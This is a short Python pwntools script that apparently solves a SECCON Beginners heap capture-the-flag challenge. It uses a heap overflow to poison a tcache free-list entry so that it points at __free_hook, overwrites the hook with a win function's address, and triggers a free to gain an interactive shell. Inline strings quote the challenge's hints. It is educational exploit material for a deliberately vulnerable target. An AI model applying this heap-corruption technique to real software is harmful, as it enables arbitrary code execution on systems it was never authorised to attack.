import time

from pwn import *

# context.log_level = "DEBUG"
context.arch = "amd64"

s = remote("bh.quals.beginners.seccon.jp", 9002)

s.recvuntil("<__free_hook>: ")
__free_hook = s.recvline().strip()

s.recvuntil("<win>: ")
win = s.recvline().strip()

# malloc -> free
s.sendlineafter("> ", "2")
s.sendline("AAAA")
time.sleep(0.3)
s.sendlineafter("> ", "3")
"""returned hint
Tcache manages freed chunks in linked lists by size.
Every list can keep up to 7 chunks.
A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk.
Let's check what happens when you overwrite fd by Heap Overflow."""

time.sleep(0.3)
s.sendlineafter("> ", "1")

packed_win = pack(int(win, 16))
packed_free_hook = pack(int(__free_hook, 16))
s.sendline(b"\x00" * 8 * 3 + b"\x30\x00\x00\x00\x00\x00\x00\x00" + packed_free_hook)
"""returned hint
It seems __free_hook is successfully linked to tcache!
And the chunk size is properly forged!"""

time.sleep(0.3)
s.sendlineafter("> ", "2")
s.sendline(packed_win)
time.sleep(0.3)
s.sendlineafter("> ", "3")
"""returned hint
It seems __free_hook is successfully linked to tcache!
The first link of tcache is __free_hook!
Also B is empty! You know what to do, right?"""

time.sleep(0.3)
s.sendlineafter("> ", "2")
s.sendline(packed_win)
time.sleep(0.3)
s.sendlineafter("> ", "3")
time.sleep(0.3)
s.interactive()
